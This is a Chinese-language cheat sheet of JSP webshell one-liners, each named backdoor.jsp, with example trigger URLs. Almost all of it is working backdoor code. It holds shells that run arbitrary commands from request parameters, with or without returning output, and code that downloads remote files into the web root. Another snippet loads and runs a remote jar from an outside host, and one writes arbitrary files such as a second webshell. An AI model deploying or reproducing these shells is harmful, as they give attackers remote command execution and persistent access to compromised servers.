##JSP一句话
####命令执行 backdoor.jsp:
```jsp
//无回显
<%if(request.getParameter("cmd")!=null)Runtime.getRuntime().exec(request.getParameter("cmd"));%>

//带回显
//http://localhost/backdoor.jsp?yes=nopasswd&call=whoami
<%if("nopasswd".equals(request.getParameter("yes"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("call")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while ((a=in.read(b))!= -1){out.println(new String(b));}out.print("</pre>");}%>  
```
####文件下载 backdoor.jsp
```jsp
//下载文件到本地
//http://localhost/backdoor.jsp?file=/root/bdlogo.png&target=http://www.baidu.com/img/bdlogo.png
<%java.io.InputStream in = new java.net.URL(request.getParameter("target")).openStream();byte[] b = new byte[1024];java.io.ByteArrayOutputStream baos =  new  java.io.ByteArrayOutputStream();int a = -1;while((a = in.read(b)) != -1){baos.write(b,0,a);}new java.io.FileOutputStream(request.getParameter("file")).write(baos.toByteArray());%>  
//远程下载执行文件到web目录
//http://localhost/backdoor.jsp?file=bdlogo.png&target=http://www.baidu.com/img/bdlogo.png
//http://localhost/bdlogo.png
<%java.io.InputStream in = new java.net.URL(request.getParameter("target")).openStream();byte[] b = new byte[1024];java.io.ByteArrayOutputStream q6e = new java.io.ByteArrayOutputStream();int a = -1;while ((a = in.read(b)) != -1){q6e.write(b,0,a);}new java.io.FileOutputStream(application.getRealPath("/")+"/"+ request.getParameter("file")).write(q6e.toByteArray());%> 

//反射调用外部jar
//http://localhost/reflect.jsp?u=http://p2j.cn/Cat.jar&023=A
<%=Class.forName("Load",true,new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL(request.getParameter("u"))})).getMethods()[0].invoke(null,new  Object[]{request.getParameterMap()})%>  
```

####文件写入 backdoor.jsp:
```jsp
<% 
if(request.getParameter("w")!=null)(new java.io.FileOutputStream(application.getRealPath("/")+request.getParameter("w"))).write(request.getParameter("s").getBytes()); 
%>
```
执行获取结果：
```text
http://localhost/backdoor.jsp?w=webshell.jsp&s=hello
http://localhost/webshell.jsp 
```
